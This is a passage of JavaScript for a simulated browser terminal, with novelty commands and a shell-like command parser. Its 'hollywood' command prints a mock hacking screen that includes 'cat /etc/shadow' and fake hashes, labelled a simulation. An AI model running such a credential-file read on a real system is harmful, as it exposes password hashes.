                        line += chars[Math.floor(Math.random() * chars.length)];
                    } else {
                        line += ' ';
                    }
                }
                output += line + '\n';
            }

            output += '\n  Wake up, Neo...\n  The Matrix has you...\n  Follow the white rabbit.\n';
            return output;
        }
    },

    cowsay: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            const text = args.slice(1).join(' ') || 'Moo!';
            const maxLen = Math.min(text.length, 40);
            const border = '-'.repeat(maxLen + 2);

            // Word wrap for long text
            const words = text.split(' ');
            const lines = [];
            let currentLine = '';

            for (const word of words) {
                if ((currentLine + ' ' + word).trim().length <= 40) {
                    currentLine = (currentLine + ' ' + word).trim();
                } else {
                    if (currentLine) lines.push(currentLine);
                    currentLine = word;
                }
            }
            if (currentLine) lines.push(currentLine);

            const maxLineLen = Math.max(...lines.map(l => l.length));
            const topBorder = ' ' + '_'.repeat(maxLineLen + 2);
            const bottomBorder = ' ' + '-'.repeat(maxLineLen + 2);

            let bubble = topBorder + '\n';
            for (let i = 0; i < lines.length; i++) {
                const line = lines[i].padEnd(maxLineLen);
                if (lines.length === 1) {
                    bubble += `< ${line} >\n`;
                } else if (i === 0) {
                    bubble += `/ ${line} \\\n`;
                } else if (i === lines.length - 1) {
                    bubble += `\\ ${line} /\n`;
                } else {
                    bubble += `| ${line} |\n`;
                }
            }
            bubble += bottomBorder;

            const cow = `
        \\   ^__^
         \\  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |
                ||     ||`;

            return bubble + cow;
        }
    },

    figlet: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            const text = args.slice(1).join(' ') || 'HELLO';

            // Simple block letter font
            const letters = {
                'A': ['  █████╗ ', ' ██╔══██╗', ' ███████║', ' ██╔══██║', ' ██║  ██║', ' ╚═╝  ╚═╝'],
                'B': [' ██████╗ ', ' ██╔══██╗', ' ██████╔╝', ' ██╔══██╗', ' ██████╔╝', ' ╚═════╝ '],
                'C': ['  ██████╗', ' ██╔════╝', ' ██║     ', ' ██║     ', ' ╚██████╗', '  ╚═════╝'],
                'D': [' ██████╗ ', ' ██╔══██╗', ' ██║  ██║', ' ██║  ██║', ' ██████╔╝', ' ╚═════╝ '],
                'E': [' ███████╗', ' ██╔════╝', ' █████╗  ', ' ██╔══╝  ', ' ███████╗', ' ╚══════╝'],
                'F': [' ███████╗', ' ██╔════╝', ' █████╗  ', ' ██╔══╝  ', ' ██║     ', ' ╚═╝     '],
                'G': ['  ██████╗ ', ' ██╔════╝ ', ' ██║  ███╗', ' ██║   ██║', ' ╚██████╔╝', '  ╚═════╝ '],
                'H': [' ██╗  ██╗', ' ██║  ██║', ' ███████║', ' ██╔══██║', ' ██║  ██║', ' ╚═╝  ╚═╝'],
                'I': [' ██╗', ' ██║', ' ██║', ' ██║', ' ██║', ' ╚═╝'],
                'J': ['      ██╗', '      ██║', '      ██║', ' ██   ██║', ' ╚█████╔╝', '  ╚════╝ '],
                'K': [' ██╗  ██╗', ' ██║ ██╔╝', ' █████╔╝ ', ' ██╔═██╗ ', ' ██║  ██╗', ' ╚═╝  ╚═╝'],
                'L': [' ██╗     ', ' ██║     ', ' ██║     ', ' ██║     ', ' ███████╗', ' ╚══════╝'],
                'M': [' ███╗   ███╗', ' ████╗ ████║', ' ██╔████╔██║', ' ██║╚██╔╝██║', ' ██║ ╚═╝ ██║', ' ╚═╝     ╚═╝'],
                'N': [' ███╗   ██╗', ' ████╗  ██║', ' ██╔██╗ ██║', ' ██║╚██╗██║', ' ██║ ╚████║', ' ╚═╝  ╚═══╝'],
                'O': ['  ██████╗ ', ' ██╔═══██╗', ' ██║   ██║', ' ██║   ██║', ' ╚██████╔╝', '  ╚═════╝ '],
                'P': [' ██████╗ ', ' ██╔══██╗', ' ██████╔╝', ' ██╔═══╝ ', ' ██║     ', ' ╚═╝     '],
                'Q': ['  ██████╗ ', ' ██╔═══██╗', ' ██║   ██║', ' ██║▄▄ ██║', ' ╚██████╔╝', '  ╚══▀▀═╝ '],
                'R': [' ██████╗ ', ' ██╔══██╗', ' ██████╔╝', ' ██╔══██╗', ' ██║  ██║', ' ╚═╝  ╚═╝'],
                'S': [' ███████╗', ' ██╔════╝', ' ███████╗', ' ╚════██║', ' ███████║', ' ╚══════╝'],
                'T': [' ████████╗', ' ╚══██╔══╝', '    ██║   ', '    ██║   ', '    ██║   ', '    ╚═╝   '],
                'U': [' ██╗   ██╗', ' ██║   ██║', ' ██║   ██║', ' ██║   ██║', ' ╚██████╔╝', '  ╚═════╝ '],
                'V': [' ██╗   ██╗', ' ██║   ██║', ' ██║   ██║', ' ╚██╗ ██╔╝', '  ╚████╔╝ ', '   ╚═══╝  '],
                'W': [' ██╗    ██╗', ' ██║    ██║', ' ██║ █╗ ██║', ' ██║███╗██║', ' ╚███╔███╔╝', '  ╚══╝╚══╝ '],
                'X': [' ██╗  ██╗', ' ╚██╗██╔╝', '  ╚███╔╝ ', '  ██╔██╗ ', ' ██╔╝ ██╗', ' ╚═╝  ╚═╝'],
                'Y': [' ██╗   ██╗', ' ╚██╗ ██╔╝', '  ╚████╔╝ ', '   ╚██╔╝  ', '    ██║   ', '    ╚═╝   '],
                'Z': [' ███████╗', ' ╚══███╔╝', '   ███╔╝ ', '  ███╔╝  ', ' ███████╗', ' ╚══════╝'],
                ' ': ['     ', '     ', '     ', '     ', '     ', '     '],
                '!': [' ██╗', ' ██║', ' ██║', ' ╚═╝', ' ██╗', ' ╚═╝'],
                '0': ['  ██████╗ ', ' ██╔═████╗', ' ██║██╔██║', ' ████╔╝██║', ' ╚██████╔╝', '  ╚═════╝ '],
                '1': ['  ██╗', ' ███║', ' ╚██║', '  ██║', '  ██║', '  ╚═╝'],
                '2': [' ██████╗ ', ' ╚════██╗', '  █████╔╝', ' ██╔═══╝ ', ' ███████╗', ' ╚══════╝'],
                '3': [' ██████╗ ', ' ╚════██╗', '  █████╔╝', '  ╚═══██╗', ' ██████╔╝', ' ╚═════╝ '],
                '4': [' ██╗  ██╗', ' ██║  ██║', ' ███████║', ' ╚════██║', '      ██║', '      ╚═╝'],
                '5': [' ███████╗', ' ██╔════╝', ' ███████╗', ' ╚════██║', ' ███████║', ' ╚══════╝'],
                '6': ['  ██████╗ ', ' ██╔════╝ ', ' ███████╗ ', ' ██╔═══██╗', ' ╚██████╔╝', '  ╚═════╝ '],
                '7': [' ███████╗', ' ╚════██║', '     ██╔╝', '    ██╔╝ ', '    ██║  ', '    ╚═╝  '],
                '8': ['  █████╗ ', ' ██╔══██╗', ' ╚█████╔╝', ' ██╔══██╗', ' ╚█████╔╝', '  ╚════╝ '],
                '9': ['  █████╗ ', ' ██╔══██╗', ' ╚██████║', '  ╚═══██║', '  █████╔╝', '  ╚════╝ ']
            };

            const upperText = text.toUpperCase().slice(0, 10); // Limit length
            let output = '\n';

            for (let row = 0; row < 6; row++) {
                let line = '';
                for (const char of upperText) {
                    if (letters[char]) {
                        line += letters[char][row];
                    } else {
                        line += '     '; // Unknown char
                    }
                }
                output += line + '\n';
            }

            return output;
        }
    },

    fortune: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            const fortunes = [
                "The best way to predict the future is to invent it. - Alan Kay",
                "Talk is cheap. Show me the code. - Linus Torvalds",
                "Any sufficiently advanced technology is indistinguishable from magic. - Arthur C. Clarke",
                "There are only two kinds of languages: the ones people complain about and the ones nobody uses. - Bjarne Stroustrup",
                "First, solve the problem. Then, write the code. - John Johnson",
                "The most dangerous phrase in the language is: We've always done it this way. - Grace Hopper",
                "Hackers are breaking the systems for profit. Before, it was about intellectual curiosity and pursuit of knowledge. - Kevin Mitnick",
                "The quieter you become, the more you are able to hear. - Kali Linux",
                "Curiosity is not a crime.",
                "In a world of locked doors, the man with the key is king. And honey, you should see me in a crown.",
                "I'm not a hacker, I'm a security researcher who doesn't fill out paperwork.",
                "There's no place like 127.0.0.1",
                "sudo make me a sandwich",
                "It's not a bug, it's an undocumented feature.",
                "99 little bugs in the code, 99 little bugs. Take one down, patch it around... 127 little bugs in the code.",
                "A computer lets you make more mistakes faster than any invention in human history. - Mitch Ratcliffe",
                "Deleted code is debugged code. - Jeff Sickel",
                "Hack the planet!",
                "The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room. - Gene Spafford",
                "Never trust a computer you can't throw out a window. - Steve Wozniak"
            ];

            const fortune = fortunes[Math.floor(Math.random() * fortunes.length)];
            return `\n  ${fortune}\n`;
        }
    },

    lolcat: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            // Check for piped input first, then args, then default
            let text;
            if (ctx.pipeInput !== null && ctx.pipeInput !== undefined) {
                text = ctx.pipeInput;
            } else if (args.length > 1) {
                text = args.slice(1).join(' ');
            } else {
                text = 'Hello, World!';
            }
            // Rainbow CSS colors
            const colors = [
                '#ff5555', // red
                '#ff9955', // orange
                '#ffff55', // yellow
                '#55ff55', // green
                '#55ffff', // cyan
                '#5555ff', // blue
                '#ff55ff'  // magenta
            ];

            const { terminalInnerContent, terminalBody } = ctx;

            // Create output div
            const outputDiv = document.createElement('div');
            outputDiv.className = 'tk-terminal-output';
            outputDiv.style.whiteSpace = 'pre-wrap';

            let colorIndex = 0;
            for (const char of text) {
                if (char === ' ') {
                    outputDiv.appendChild(document.createTextNode(' '));
                } else if (char === '\n') {
                    outputDiv.appendChild(document.createElement('br'));
                } else {
                    const span = document.createElement('span');
                    span.style.color = colors[colorIndex % colors.length];
                    span.textContent = char;
                    outputDiv.appendChild(span);
                    colorIndex++;
                }
            }

            terminalInnerContent.appendChild(outputDiv);
            terminalBody.scrollTop = terminalBody.scrollHeight;

            return null; // Already displayed output via DOM
        }
    },

    hollywood: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            const output = `
╔══════════════════════════════════════════════════════════════════╗
║  INITIALIZING HACK SEQUENCE...                                   ║
╠══════════════════════════════════════════════════════════════════╣
║  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░] 78%             ║
║                                                                  ║
║  > Bypassing firewall....................... [OK]                ║
║  > Spoofing MAC address..................... [OK]                ║
║  > Establishing encrypted tunnel............ [OK]                ║
║  > Injecting payload........................ [OK]                ║
║  > Cracking password hashes................. [OK]                ║
║  > Accessing mainframe...................... [OK]                ║
║  > Downloading secret files................. [IN PROGRESS]       ║
║                                                                  ║
║  ┌──────────────────────────────────────────────────────────┐    ║
║  │ SYSTEM COMPROMISED                                       │    ║
║  │                                                          │    ║
║  │ Root access granted.                                     │    ║
║  │ All your base are belong to us.                          │    ║
║  └──────────────────────────────────────────────────────────┘    ║
║                                                                  ║
║  $ cat /etc/shadow                                               ║
║  root:$6$r4nd0m$h4ck3d:18000:0:99999:7:::                        ║
║  admin:$6$s4lt3d$pwn3d:18000:0:99999:7:::                        ║
║                                                                  ║
║  WARNING: This is a simulation. No actual hacking occurred.      ║
╚══════════════════════════════════════════════════════════════════╝

  "I'm in." - Every movie hacker ever
`;
            return output;
        }
    }
};

// ============================================================================
// MAIN COMMAND PROCESSOR
// ============================================================================

// Execute a single command and return output as string (for piping)
async function executeCommandForPipe(commandStr, pipeInput, ctx) {
    const args = commandStr.split(' ').filter(arg => arg !== '');
    const commandName = args[0];

    if (!commandName) {
        return '';
    }

    // Build modified context for piped command
    const pipeCtx = {
        ...ctx,
        pipeInput: pipeInput,
        isPiped: true,
        outputFile: null,
        appendMode: false
    };

    let outputText = '';

    // Check if it's a built-in command first
    if (commands[commandName] && commands[commandName].isBuiltin) {
        window.isCommandRunning = true;
        window.isCommandInterrupted = false;
        outputText = await commands[commandName].execute(args, pipeCtx);
        window.isCommandRunning = false;
    } else {
        // Check if command is in PATH
        let commandPath = null;

        if (commandName.startsWith('/') || commandName.startsWith('./') || commandName.startsWith('../')) {
            const resolvedPath = resolvePath(commandName, environment.CWD);
            const file = getFile(resolvedPath);
            if (file && file.type === 'file' && file.content === 'ELF executable') {
                commandPath = resolvedPath;
            }
        } else {
            const PATH = environment.PATH.split(':');
            for (const p of PATH) {
                const potentialPath = `${p}/${commandName}`;
                const file = getFile(potentialPath);
                if (file && file.type === 'file' && file.content === 'ELF executable') {
                    commandPath = potentialPath;
                    break;
                }
            }
        }

        if (commandPath) {
            const resolvedFile = getFile(commandPath);
            if (resolvedFile && resolvedFile.type === 'directory') {
                outputText = `bash: ${commandPath}: Is a directory`;
            } else if (commandPath.startsWith('/sbin/') && environment.USER !== 'root') {
                outputText = `bash: ${commandPath}: Permission denied`;
            } else if (commands[commandName]) {
                window.isCommandRunning = true;
                window.isCommandInterrupted = false;
                outputText = await commands[commandName].execute(args, pipeCtx);
                window.isCommandRunning = false;
            } else {
                outputText = `bash: ${commandName}: command not found (executable not handled)`;
            }
        } else {
            outputText = `bash: ${commandName}: command not found`;
        }
    }

    return outputText || '';
}

// Process piped commands
async function processPipedCommands(pipeSegments, {
    terminalInnerContent,
    terminalBody,
    currentInput,
    commandHistory,
    username,
    getDisplayPath,
    setNewCurrentDirectory,
    waitKey
}) {
    const ctx = {
        terminalInnerContent,
        terminalBody,
        currentInput,
        commandHistory,
        username,
        getDisplayPath,
        setNewCurrentDirectory,
        waitKey
    };

    let pipeInput = null;

    // Execute each command in the pipeline
    for (let i = 0; i < pipeSegments.length; i++) {
        const segment = pipeSegments[i];

        // Last command in pipeline - output to terminal
        if (i === pipeSegments.length - 1) {
            const args = segment.split(' ').filter(arg => arg !== '');
            const commandName = args[0];

            if (!commandName) {
                break;
            }

            // Handle output redirection for last command
            let outputFile = null;
            let appendMode = false;
            const outputIndex = args.findIndex(arg => arg === '>' || arg === '>>');
            if (outputIndex !== -1) {
                if (args[outputIndex] === '>') {
                    outputFile = args[outputIndex + 1];
                } else if (args[outputIndex] === '>>') {
                    outputFile = args[outputIndex + 1];
                    appendMode = true;
                }
                args.splice(outputIndex, 2);
            }

            const finalCtx = {
                ...ctx,
                pipeInput: pipeInput,
                isPiped: true,
                outputFile,
                appendMode
            };

            let outputText = '';

            // Execute final command
            if (commands[commandName] && commands[commandName].isBuiltin) {
                window.isCommandRunning = true;
                window.isCommandInterrupted = false;
                outputText = await commands[commandName].execute(args, finalCtx);
                window.isCommandRunning = false;
            } else {
                // Check PATH
                let commandPath = null;
                const PATH = environment.PATH.split(':');
                for (const p of PATH) {
                    const potentialPath = `${p}/${commandName}`;
                    const file = getFile(potentialPath);
                    if (file && file.type === 'file' && file.content === 'ELF executable') {
                        commandPath = potentialPath;
                        break;
                    }
                }

                if (commandPath && commands[commandName]) {
                    window.isCommandRunning = true;
                    window.isCommandInterrupted = false;
                    outputText = await commands[commandName].execute(args, finalCtx);
                    window.isCommandRunning = false;
                } else if (commandPath) {
                    outputText = `bash: ${commandName}: command not found (executable not handled)`;
                } else {
                    outputText = `bash: ${commandName}: command not found`;
                }
            }

            // Handle output redirection for final command
            if (outputFile && outputText) {
                if (createFile(outputFile, outputText, appendMode, environment.CWD)) {
                    outputText = '';
                } else {
                    outputText = `bash: ${outputFile}: Permission denied`;
                }
            }

            // Display output
            if (outputText !== null && outputText !== '') {
                const output = document.createElement('div');
                output.className = 'tk-terminal-output';
                output.textContent = outputText;
                terminalInnerContent.appendChild(output);
            }
        } else {
            // Intermediate command - capture output for next command
            pipeInput = await executeCommandForPipe(segment, pipeInput, ctx);
        }
    }

    return { currentDirectory: environment.CWD, previousDirectory: environment.OLDPWD };
}

// Helper function to execute a single command (used by command chaining)
async function executeSingleCommand(cmd, {
    terminalInnerContent,
    terminalBody,
    currentInput,
    commandHistory,
    username,
    getDisplayPath,
    setNewCurrentDirectory,
    waitKey
}) {
    if (cmd === '') {
        return { exitCode: 0 };
    }

    // Expand variables
    const expandedCmd = expandVariables(cmd);

    // Check for pipes within this single command
    const pipeSegments = expandedCmd.split('|').map(s => s.trim());

    if (pipeSegments.length > 1) {
        // Handle piped commands
        await processPipedCommands(pipeSegments, {
            terminalInnerContent,
            terminalBody,
            currentInput,
            commandHistory,
            username,
            getDisplayPath,
            setNewCurrentDirectory,
            waitKey
        });
        return { exitCode: 0 };
    }

    // Parse arguments
    const args = expandedCmd.split(' ').filter(arg => arg !== '');
    let commandName = args[0];

    // Handle output redirection
    let outputFile = null;
    let appendMode = false;
    const outputIndex = args.findIndex(arg => arg === '>' || arg === '>>');
    if (outputIndex !== -1) {
        if (args[outputIndex] === '>') {
            outputFile = args[outputIndex + 1];
        } else if (args[outputIndex] === '>>') {
            outputFile = args[outputIndex + 1];
            appendMode = true;
        }
        args.splice(outputIndex, 2);
    }

    // Build context object
    const ctx = {
        terminalInnerContent,
        terminalBody,
        currentInput,
        commandHistory,
        username,
        getDisplayPath,
        setNewCurrentDirectory,
        waitKey,
        outputFile,
        appendMode
    };

    let outputText = '';
    let commandFound = false;
    let exitCode = 0;

    // Global --help handler for all commands
    if (args.includes('--help')) {
        if (commandHelp[commandName]) {
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.style.whiteSpace = 'pre-wrap';
            output.textContent = commandHelp[commandName];
            terminalInnerContent.appendChild(output);
            terminalBody.scrollTop = terminalBody.scrollHeight;
            return { exitCode: 0 };
        } else if (commands[commandName]) {
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.style.whiteSpace = 'pre-wrap';
            output.textContent = `${commandName}: no help available`;
            terminalInnerContent.appendChild(output);
            terminalBody.scrollTop = terminalBody.scrollHeight;
            return { exitCode: 0 };
        }
        // If command not found, fall through to normal handling for "command not found" error
    }

    // Check if it's a built-in command first
    if (commands[commandName] && commands[commandName].isBuiltin) {
        commandFound = true;
        window.isCommandRunning = true;
        window.isCommandInterrupted = false;
        outputText = await commands[commandName].execute(args, ctx);
        window.isCommandRunning = false;
        exitCode = 0; // Built-in commands generally succeed
    } else {
        // Check if command is in PATH or is an absolute/relative path
        let commandPath = null;

        if (commandName.startsWith('/') || commandName.startsWith('./') || commandName.startsWith('../')) {
            const resolvedPath = resolvePath(commandName, environment.CWD);
            const file = getFile(resolvedPath);
            if (file && file.type === 'file' && file.content === 'ELF executable') {
                commandPath = resolvedPath;
                commandName = commandName.split('/').pop();
            }
        } else {
            const PATH = environment.PATH.split(':');
            for (const p of PATH) {
                const potentialPath = `${p}/${commandName}`;
                const file = getFile(potentialPath);
                if (file && file.type === 'file' && file.content === 'ELF executable') {
                    commandPath = potentialPath;
                    break;
                }
            }
        }

        if (commandPath) {
            const resolvedFile = getFile(commandPath);
            if (resolvedFile && resolvedFile.type === 'directory') {
                outputText = `bash: ${commandPath}: Is a directory`;
                exitCode = 126;
            } else if (commandPath.startsWith('/sbin/') && environment.USER !== 'root') {
                // /sbin commands require root privileges
                outputText = `bash: ${commandPath}: Permission denied`;
                exitCode = 126;
            } else if (commands[commandName]) {
                commandFound = true;
                window.isCommandRunning = true;
                window.isCommandInterrupted = false;
                outputText = await commands[commandName].execute(args, ctx);
                window.isCommandRunning = false;
                exitCode = 0;
            } else {
                outputText = `bash: ${commandName}: command not found (executable not handled)`;
                exitCode = 127;
            }
        } else {
            outputText = `bash: ${commandName}: command not found`;
            exitCode = 127;
        }
    }

    // Handle output redirection
    if (outputFile && outputText) {
        if (createFile(outputFile, outputText, appendMode, environment.CWD)) {
            outputText = '';
        } else {
            outputText = `bash: ${outputFile}: Permission denied`;
            exitCode = 1;
        }
    }

    // Display output (if not null)
    if (outputText !== null && outputText !== '') {
        const output = document.createElement('div');
        output.className = 'tk-terminal-output';
        output.style.whiteSpace = 'pre-wrap';
        output.textContent = outputText;
        terminalInnerContent.appendChild(output);
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }

    return { exitCode };
}

async function processCommand(cmd, {
    terminalInnerContent,
    terminalBody,
    currentInput,
    commandHistory,
    username,
    getDisplayPath,
    getPromptText,
    setNewCurrentDirectory,
    waitKey
}) {
    // Get input line info
    const inputLine = currentInput.parentNode;
    const prompt = inputLine.querySelector('.tk-terminal-prompt');

    // Use prompt element text content, or fall back to getPromptText function
    const promptText = prompt ? prompt.textContent : (getPromptText ? getPromptText() : '');

    // Create frozen command line
    const frozenLine = document.createElement('div');
    frozenLine.className = 'tk-terminal-frozen-line';
    frozenLine.textContent = promptText + cmd;
    inputLine.parentNode.replaceChild(frozenLine, inputLine);

    terminalBody.focus();

    if (cmd === '') {
        return { currentDirectory: environment.CWD, previousDirectory: environment.OLDPWD };
    }

    // Add command to history (both in-memory and .bash_history file)
    addToHistory(cmd);

    // Expand variables
    const expandedCmd = expandVariables(cmd);

    // Check for command chaining (&&, ||, ;) - must check before pipes
    const chainPattern = /(\&\&|\|\||;)/g;
    const chainMatches = expandedCmd.match(chainPattern);

    if (chainMatches && chainMatches.length > 0) {
        // Handle chained commands
        const parts = expandedCmd.split(chainPattern);
        const commands = [];
        const operators = [];

        for (let i = 0; i < parts.length; i++) {
            if (i % 2 === 0) {
                // Even indices are commands
                const cmd = parts[i].trim();
                if (cmd) commands.push(cmd);
            } else {
                // Odd indices are operators
                operators.push(parts[i]);
            }
        }

        // Execute commands in sequence based on operators
        let lastExitCode = 0;
        for (let i = 0; i < commands.length; i++) {
            const prevOperator = i > 0 ? operators[i - 1] : null;

            // Determine if we should execute this command
            let shouldExecute = true;
            if (prevOperator === '&&' && lastExitCode !== 0) {
                shouldExecute = false;
            } else if (prevOperator === '||' && lastExitCode === 0) {
                shouldExecute = false;
            }

            if (shouldExecute) {
                // Recursively process each command (but don't add to history again)
                // We need to execute the command without creating a frozen line
                const result = await executeSingleCommand(commands[i], {
                    terminalInnerContent,
                    terminalBody,
                    currentInput,
                    commandHistory,
                    username,
                    getDisplayPath,
                    setNewCurrentDirectory,
                    waitKey
                });

                // Determine exit code (0 = success, non-zero = error)
                lastExitCode = result.exitCode || 0;
            }
        }

        return { currentDirectory: environment.CWD, previousDirectory: environment.OLDPWD };
    }

    // Check for pipes
    const pipeSegments = expandedCmd.split('|').map(s => s.trim());

    if (pipeSegments.length > 1) {
        // Handle piped commands
        return await processPipedCommands(pipeSegments, {
            terminalInnerContent,
            terminalBody,
            currentInput,
            commandHistory,
            username,
            getDisplayPath,
            setNewCurrentDirectory,
            waitKey
        });
    }

    // Parse arguments (no pipes)
    const args = expandedCmd.split(' ').filter(arg => arg !== '');
    let commandName = args[0];

    // Handle output redirection
    let outputFile = null;
    let appendMode = false;
    const outputIndex = args.findIndex(arg => arg === '>' || arg === '>>');
    if (outputIndex !== -1) {
        if (args[outputIndex] === '>') {
            outputFile = args[outputIndex + 1];
        } else if (args[outputIndex] === '>>') {
            outputFile = args[outputIndex + 1];
            appendMode = true;
        }
        args.splice(outputIndex, 2);
    }

    // Build context object
    const ctx = {
        terminalInnerContent,
        terminalBody,
        currentInput,
        commandHistory,
        username,
        getDisplayPath,
        setNewCurrentDirectory,
        waitKey,
        outputFile,
        appendMode
    };

    let outputText = '';
    let commandFound = false;

    // Global --help handler for all commands
    if (args.includes('--help')) {
        if (commandHelp[commandName]) {
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.style.whiteSpace = 'pre-wrap';
            output.textContent = commandHelp[commandName];
            terminalInnerContent.appendChild(output);
            terminalBody.scrollTop = terminalBody.scrollHeight;
            return { currentDirectory: environment.CWD, previousDirectory: environment.OLDPWD };
        } else if (commands[commandName]) {
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.style.whiteSpace = 'pre-wrap';
            output.textContent = `${commandName}: no help available`;
            terminalInnerContent.appendChild(output);
            terminalBody.scrollTop = terminalBody.scrollHeight;
            return { currentDirectory: environment.CWD, previousDirectory: environment.OLDPWD };
        }
        // If command not found, fall through to normal handling for "command not found" error
    }

    // Check if it's a built-in command first
    if (commands[commandName] && commands[commandName].isBuiltin) {
        commandFound = true;
        window.isCommandRunning = true;
        window.isCommandInterrupted = false;
        outputText = await commands[commandName].execute(args, ctx);
        window.isCommandRunning = false;
    } else {
        // Check if command is in PATH or is an absolute/relative path
        let commandPath = null;

        if (commandName.startsWith('/') || commandName.startsWith('./') || commandName.startsWith('../')) {
            const resolvedPath = resolvePath(commandName, environment.CWD);
            const file = getFile(resolvedPath);
            if (file && file.type === 'file' && file.content === 'ELF executable') {
                commandPath = resolvedPath;
                commandName = commandName.split('/').pop();
            }
        } else {
            const PATH = environment.PATH.split(':');
            for (const p of PATH) {
                const potentialPath = `${p}/${commandName}`;
                const file = getFile(potentialPath);
                if (file && file.type === 'file' && file.content === 'ELF executable') {
                    commandPath = potentialPath;
                    break;
                }
            }
        }

        if (commandPath) {
            const resolvedFile = getFile(commandPath);
            if (resolvedFile && resolvedFile.type === 'directory') {
                outputText = `bash: ${commandPath}: Is a directory`;
            } else if (commandPath.startsWith('/sbin/') && environment.USER !== 'root') {
                // /sbin commands require root privileges
                outputText = `bash: ${commandPath}: Permission denied`;
            } else if (commands[commandName]) {
                commandFound = true;
                window.isCommandRunning = true;
                window.isCommandInterrupted = false;
                outputText = await commands[commandName].execute(args, ctx);
                window.isCommandRunning = false;
            } else {
                outputText = `bash: ${commandName}: command not found (executable not handled)`;
            }
        } else {
            outputText = `bash: ${commandName}: command not found`;
        }
    }

    // Handle output redirection
    if (outputFile && outputText) {
        if (createFile(outputFile, outputText, appendMode, environment.CWD)) {
            outputText = '';
        } else {
            outputText = `bash: ${outputFile}: Permission denied`;
        }
    }

    // Display output (if not null)
    if (outputText !== null && outputText !== '') {
        const output = document.createElement('div');
        output.className = 'tk-terminal-output';
        output.textContent = outputText;
        terminalInnerContent.appendChild(output);
    }

    return { currentDirectory: environment.CWD, previousDirectory: environment.OLDPWD };
}

// ============================================================================
// EXPORTS
// ============================================================================

export {
    commands,
    commandHelp,
    processCommand,
    generatePingOutput,
    generateTracerouteOutput,
    generateTcpdumpOutput,
    generateNmapOutput,
    generateWhoOutput,
    generatePsOutput,
    generateTopOutput,
    generateIfconfigOutput,
    generateNetstatOutput,
    generateRouteOutput,
    generateWhoisOutput,
    generateNslookupOutput,
    generateIptablesOutput,
    listDirectory,
    resolvePath,
    environment
};
